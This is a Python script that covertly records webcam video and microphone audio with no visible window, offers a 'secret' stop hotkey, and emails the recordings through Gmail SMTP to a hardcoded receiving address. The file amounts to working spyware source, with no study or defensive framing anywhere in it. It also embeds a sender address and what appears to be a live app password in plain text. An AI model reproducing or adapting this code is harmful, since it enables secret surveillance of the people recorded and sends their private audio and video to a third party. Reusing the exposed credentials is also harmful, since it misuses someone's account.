import subprocess
import sys
import os

# # Install required packages
# packages = ["opencv-python", "sounddevice", "scipy", "numpy", "pynput"]
# for package in packages:
#     try:
#         subprocess.check_call([sys.executable, "-m", "pip", "install", package])
#         print(f"Successfully installed {package}")
#     except subprocess.CalledProcessError:
#         print(f"Failed to install {package}")

import cv2
import sounddevice as sd
from scipy.io.wavfile import write
import numpy as np
import threading
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from pynput import keyboard

# ─────────────────────────────────────────────
#  EMAIL CONFIGURATION
# ─────────────────────────────────────────────
SENDER_EMAIL    = "vazgensimonyan4@gmail.com"
SENDER_PASSWORD = "poap arvr ilsl ahip"
RECEIVER_EMAIL  = "vazgensimonyan542@gmail.com"
# ─────────────────────────────────────────────

# ─────────────────────────────────────────────
#  RECORDING CONFIGURATION
#  Set RECORD_DURATION_SECONDS to None to record
#  until the secret hotkey is pressed (Ctrl+Shift+S)
# ─────────────────────────────────────────────
RECORD_DURATION_SECONDS = 10  # e.g. 30 for 30 seconds, or None for manual stop
SECRET_STOP_HOTKEY      = None
# ─────────────────────────────────────────────
video_filename = "video.avi"
audio_filename = "audio.wav"
fs       = 44100
channels = 1
recording = True
audio_data = []


def record_audio():
    global recording, audio_data

    def callback(indata, frames, time_info, status):
        if recording:
            audio_data.append(indata.copy())

    with sd.InputStream(samplerate=fs, channels=channels, callback=callback):
        while recording:
            sd.sleep(100)


def stop_on_hotkey():
    """Listen in background for Ctrl+Shift+S to stop recording."""
    global recording

    def on_activate():
        global recording
        recording = False

    with keyboard.GlobalHotKeys({SECRET_STOP_HOTKEY: on_activate}) as h:
        while recording:
            time.sleep(0.3)


def send_email(video_path: str, audio_path: str):
    print("\nPreparing to send email...")

    msg = MIMEMultipart()
    msg["From"]    = SENDER_EMAIL
    msg["To"]      = RECEIVER_EMAIL
    msg["Subject"] = "What you need"

    body = (
        "Hi,\n\n"
        "Has finished. "
        "Find files attached.\n\n"
        "— DieScript"
    )
    msg.attach(MIMEText(body, "plain"))

    for filepath in (video_path, audio_path):
        if not filepath or not os.path.exists(filepath):
            continue

        filename = os.path.basename(filepath)
        print(f"  Attaching {filename} ({os.path.getsize(filepath) / 1024:.1f} KB)...")

        with open(filepath, "rb") as f:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(f.read())

        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f'attachment; filename="{filename}"')
        msg.attach(part)

    try:
        with smtplib.SMTP("smtp.gmail.com", 587, timeout=30) as server:
            server.ehlo()
            server.starttls()
            server.ehlo()
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
        print(f"✓ Email sent successfully to {RECEIVER_EMAIL}")

    except smtplib.SMTPAuthenticationError:
        print("✗ Authentication failed! Check your App Password.")
    except smtplib.SMTPException as e:
        print(f"✗ SMTP error: {e}")
    except Exception as e:
        print(f"✗ Unexpected error: {e}")


def main():
    global recording

    # ── Find camera ──────────────────────────────
    cap = None
    for camera_index in range(5):
        cap = cv2.VideoCapture(camera_index)
        time.sleep(0.3)
        if cap.isOpened():
            ret, test_frame = cap.read()
            if ret:
                break
            cap.release()
        else:
            cap.release()

    if not cap or not cap.isOpened():
        print("ERROR: Could not open any camera")
        recording = False
        return

    ret, test_frame = cap.read()
    if not ret:
        cap.release()
        recording = False
        return

    height, width = test_frame.shape[:2]

    # ── Video writer ─────────────────────────────
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter(video_filename, fourcc, 20.0, (width, height))

    if not out.isOpened():
        cap.release()
        recording = False
        return

    # ── Start audio thread ───────────────────────
    audio_thread = threading.Thread(target=record_audio, daemon=True)
    audio_thread.start()

    # ── Start hotkey listener thread ─────────────
    hotkey_thread = threading.Thread(target=stop_on_hotkey, daemon=True)
    hotkey_thread.start()

    start_time = time.time()
    print("Recording silently in background...")
    if RECORD_DURATION_SECONDS:
        print(f"Will stop automatically after {RECORD_DURATION_SECONDS} seconds.")
    else:
        print(f"Press {SECRET_STOP_HOTKEY.upper()} anywhere to stop recording.")

    # ── Record loop — NO imshow, NO window ──────
    frame_count = 0
    while recording:
        ret, frame = cap.read()
        if not ret:
            break

        out.write(frame)   # write frame silently — no display
        frame_count += 1

        # Auto-stop after duration if set
        if RECORD_DURATION_SECONDS and (time.time() - start_time) >= RECORD_DURATION_SECONDS:
            recording = False
            break

        time.sleep(0.001)  # small sleep to avoid pegging CPU

    # ── Cleanup ──────────────────────────────────
    recording = False
    cap.release()
    out.release()
    # NO cv2.destroyAllWindows() needed — no windows were opened
    print(f"Recording stopped. Frames captured: {frame_count}")

    audio_thread.join(timeout=2)

    # ── Save audio ───────────────────────────────
    audio_saved = False
    if audio_data:
        audio_array = np.concatenate(audio_data, axis=0)
        write(audio_filename, fs, audio_array)
        audio_saved = True
        print(f"✓ Video saved: {video_filename}")
        print(f"✓ Audio saved: {audio_filename}")
    else:
        print("⚠ No audio data recorded.")

    # ── Send email ───────────────────────────────
    send_email(
        video_path=video_filename,
        audio_path=audio_filename if audio_saved else "",
    )
if __name__ == "__main__":
    main()